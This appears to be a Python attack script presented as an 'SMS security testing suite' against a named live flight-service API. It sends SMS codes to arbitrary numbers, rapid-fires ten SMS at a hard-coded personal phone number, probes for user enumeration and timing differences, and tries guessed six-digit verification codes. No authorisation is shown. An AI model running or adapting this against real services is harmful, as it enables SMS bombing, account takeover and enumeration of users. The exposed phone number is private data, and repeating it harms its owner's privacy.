#!/usr/bin/env python3
"""
Comprehensive SMS Security Testing Suite
Tests SMS authentication for vulnerabilities:
- Arbitrary number triggering
- Rate limiting
- User enumeration
- Code brute forcing
- Timing attacks
"""

import requests
import json
import time
from datetime import datetime
import random

API_URL = "https://vauntapi.flyvaunt.com"

# Test phone numbers
VALID_PHONE = "+13035234453"  # Sameer's real number
INVALID_PHONES = [
    "+11111111111",
    "+12222222222",
    "+19999999999",
    "+10000000000",
    "+15555555555",
]

results = []

def trigger_sms(phone_number):
    """Trigger SMS code to a phone number"""
    start_time = time.time()
    try:
        response = requests.post(
            f"{API_URL}/v1/auth/initiateSignIn",
            json={"phoneNumber": phone_number},
            timeout=10
        )
        elapsed = time.time() - start_time
        
        return {
            "phone": phone_number,
            "status": response.status_code,
            "elapsed": elapsed,
            "response": response.text[:200],
            "success": response.status_code == 200
        }
    except Exception as e:
        elapsed = time.time() - start_time
        return {
            "phone": phone_number,
            "status": "ERROR",
            "elapsed": elapsed,
            "error": str(e)
        }

def verify_code(phone_number, code):
    """Attempt to verify a code"""
    start_time = time.time()
    try:
        response = requests.post(
            f"{API_URL}/v1/auth/completeSignIn",
            json={
                "phoneNumber": phone_number,
                "challengeCode": code
            },
            timeout=10
        )
        elapsed = time.time() - start_time
        
        return {
            "phone": phone_number,
            "code": code,
            "status": response.status_code,
            "elapsed": elapsed,
            "response": response.text[:200],
            "success": response.status_code == 200
        }
    except Exception as e:
        elapsed = time.time() - start_time
        return {
            "phone": phone_number,
            "code": code,
            "status": "ERROR",
            "elapsed": elapsed,
            "error": str(e)
        }

print("="*80)
print("SMS SECURITY TESTING SUITE")
print("="*80)
print(f"Started: {datetime.now()}")
print()

# Test 1: SMS triggering to arbitrary numbers
print("\n" + "="*80)
print("TEST 1: SMS TRIGGERING TO ARBITRARY NUMBERS")
print("="*80)

print("\n1.1 Testing SMS to invalid/unregistered numbers")
for phone in INVALID_PHONES[:3]:
    result = trigger_sms(phone)
    results.append({"test": "arbitrary_sms", **result})
    print(f"  {phone:15} → Status: {result['status']} ({result['elapsed']:.2f}s)")
    if result.get('success'):
        print(f"    ⚠️ SMS TRIGGERED TO UNREGISTERED NUMBER!")
    time.sleep(0.5)  # Be nice to the API

# Test 2: Rate limiting on SMS requests
print("\n" + "="*80)
print("TEST 2: RATE LIMITING ON SMS REQUESTS")
print("="*80)

print("\n2.1 Rapid-fire SMS requests to same number")
rapid_results = []
for i in range(10):
    result = trigger_sms(VALID_PHONE)
    rapid_results.append(result)
    results.append({"test": "rate_limit_sms", "attempt": i+1, **result})
    print(f"  Attempt {i+1:2}: Status {result['status']} ({result['elapsed']:.2f}s)")
    
    if result['status'] == 429:
        print(f"    ✅ RATE LIMITING DETECTED at attempt {i+1}")
        break
    elif result['status'] != 200:
        print(f"    Response: {result.get('response', 'N/A')[:80]}")
    
    time.sleep(0.1)  # Minimal delay

if all(r['success'] for r in rapid_results):
    print(f"    ⚠️ NO RATE LIMITING - All 10 requests succeeded!")

print("\n2.2 Testing rate limiting across different numbers")
for i, phone in enumerate(INVALID_PHONES, 1):
    result = trigger_sms(phone)
    results.append({"test": "rate_limit_different", "attempt": i, **result})
    print(f"  {phone:15} → Status: {result['status']}")
    time.sleep(0.1)

# Test 3: User enumeration via timing/response differences
print("\n" + "="*80)
print("TEST 3: USER ENUMERATION")
print("="*80)

print("\n3.1 Comparing responses for registered vs unregistered numbers")
registered_result = trigger_sms(VALID_PHONE)
unregistered_result = trigger_sms("+19999999999")

print(f"\nRegistered number ({VALID_PHONE}):")
print(f"  Status: {registered_result['status']}")
print(f"  Time: {registered_result['elapsed']:.3f}s")
print(f"  Response: {registered_result.get('response', 'N/A')[:100]}")

print(f"\nUnregistered number (+19999999999):")
print(f"  Status: {unregistered_result['status']}")
print(f"  Time: {unregistered_result['elapsed']:.3f}s")
print(f"  Response: {unregistered_result.get('response', 'N/A')[:100]}")

time_diff = abs(registered_result['elapsed'] - unregistered_result['elapsed'])
response_diff = registered_result.get('response') != unregistered_result.get('response')

if time_diff > 0.5:
    print(f"\n  ⚠️ TIMING DIFFERENCE: {time_diff:.3f}s - Potential enumeration vector!")

if response_diff:
    print(f"  ⚠️ RESPONSE DIFFERENCE - Potential enumeration vector!")

results.append({
    "test": "user_enumeration",
    "registered": registered_result,
    "unregistered": unregistered_result,
    "time_diff": time_diff,
    "response_diff": response_diff
})

# Test 4: Code brute forcing
print("\n" + "="*80)
print("TEST 4: SMS CODE BRUTE FORCING")
print("="*80)

print("\n4.1 Testing sequential code attempts")
print("First, trigger a real SMS...")
trigger_result = trigger_sms(VALID_PHONE)
print(f"  SMS triggered: Status {trigger_result['status']}")

if trigger_result['success']:
    print("\n4.2 Attempting to brute force codes (testing rate limiting)")
    brute_attempts = []
    
    # Test if we can try multiple codes
    test_codes = ["000000", "111111", "123456", "999999", "000001"]
    
    for i, code in enumerate(test_codes, 1):
        result = verify_code(VALID_PHONE, code)
        brute_attempts.append(result)
        results.append({"test": "code_brute_force", "attempt": i, **result})
        
        print(f"  Code {code}: Status {result['status']} ({result['elapsed']:.2f}s)")
        
        if result['status'] == 429:
            print(f"    ✅ RATE LIMITING on code attempts detected!")
            break
        elif result['status'] == 200:
            print(f"    🚨 CODE ACCEPTED! (unexpected unless this is the real code)")
            break
        
        time.sleep(0.1)
    
    if all(r['status'] == 400 for r in brute_attempts):
        print(f"    ⚠️ NO RATE LIMITING on verification attempts - Brute force possible!")

# Test 5: Code prediction/patterns
print("\n" + "="*80)
print("TEST 5: CODE PREDICTION ANALYSIS")
print("="*80)

print("\n5.1 Triggering multiple SMS to check for patterns")
print("(This would require triggering many SMS codes - skipping for API safety)")
print("To fully test: Trigger 50+ SMS codes and analyze for:")
print("  - Sequential patterns (123456, 123457, 123458...)")
print("  - Timestamp-based patterns")
print("  - Weak random number generation")

# Test 6: Timing attacks on code validation
print("\n" + "="*80)
print("TEST 6: TIMING ATTACKS ON CODE VALIDATION")
print("="*80)

print("\n6.1 Testing if timing varies for correct vs incorrect codes")
print("(Requires knowing a valid code - testing with invalid codes)")

timing_tests = []
for i in range(5):
    code = f"{random.randint(0, 999999):06d}"
    result = verify_code(VALID_PHONE, code)
    timing_tests.append(result)
    print(f"  Code {code}: {result['elapsed']:.3f}s (Status: {result['status']})")
    time.sleep(0.2)

avg_time = sum(r['elapsed'] for r in timing_tests) / len(timing_tests)
print(f"\nAverage validation time: {avg_time:.3f}s")

# Check for timing consistency
timing_variance = max(r['elapsed'] for r in timing_tests) - min(r['elapsed'] for r in timing_tests)
print(f"Timing variance: {timing_variance:.3f}s")

if timing_variance > 1.0:
    print("  ⚠️ HIGH TIMING VARIANCE - Potential timing attack vector!")

results.append({
    "test": "timing_attack",
    "avg_time": avg_time,
    "variance": timing_variance,
    "samples": timing_tests
})

# Test 7: Code expiration
print("\n" + "="*80)
print("TEST 7: CODE EXPIRATION & REUSE")
print("="*80)

print("\n7.1 Testing code reuse after successful verification")
print("(Skipped - would require valid code verification)")

# Summary
print("\n" + "="*80)
print("SUMMARY & SECURITY ASSESSMENT")
print("="*80)

vulnerabilities = []

# Check for specific vulnerabilities
sms_to_invalid = any(r.get('success') for r in results if r.get('test') == 'arbitrary_sms')
no_sms_rate_limit = all(r.get('success') for r in results if r.get('test') == 'rate_limit_sms')
no_verify_rate_limit = all(r.get('status') == 400 for r in results if r.get('test') == 'code_brute_force')
enumeration_possible = any(r.get('time_diff', 0) > 0.5 or r.get('response_diff') for r in results if r.get('test') == 'user_enumeration')

print(f"\n🔍 Vulnerability Assessment:")
print(f"  SMS to unregistered numbers: {'🚨 VULNERABLE' if sms_to_invalid else '✅ PROTECTED'}")
if sms_to_invalid:
    vulnerabilities.append("SMS can be triggered to arbitrary/unregistered numbers")

print(f"  SMS rate limiting: {'🚨 MISSING' if no_sms_rate_limit else '✅ PRESENT'}")
if no_sms_rate_limit:
    vulnerabilities.append("No rate limiting on SMS initiation - SMS bombing possible")

print(f"  Code verification rate limiting: {'🚨 MISSING' if no_verify_rate_limit else '✅ PRESENT'}")
if no_verify_rate_limit:
    vulnerabilities.append("No rate limiting on code verification - Brute force possible (1M attempts for 6-digit code)")

print(f"  User enumeration: {'🚨 POSSIBLE' if enumeration_possible else '✅ PROTECTED'}")
if enumeration_possible:
    vulnerabilities.append("User enumeration possible via timing/response differences")

print(f"\n📊 Total tests performed: {len(results)}")
print(f"🚨 Vulnerabilities identified: {len(vulnerabilities)}")

if vulnerabilities:
    print(f"\n⚠️ IDENTIFIED VULNERABILITIES:")
    for i, vuln in enumerate(vulnerabilities, 1):
        print(f"  {i}. {vuln}")
else:
    print(f"\n✅ No major SMS security vulnerabilities detected!")

# Save results
output_file = 'sms_security_test_results.json'
with open(output_file, 'w') as f:
    json.dump(results, f, indent=2)

print(f"\n✅ Results saved to {output_file}")
print(f"\nCompleted: {datetime.now()}")
print("="*80)
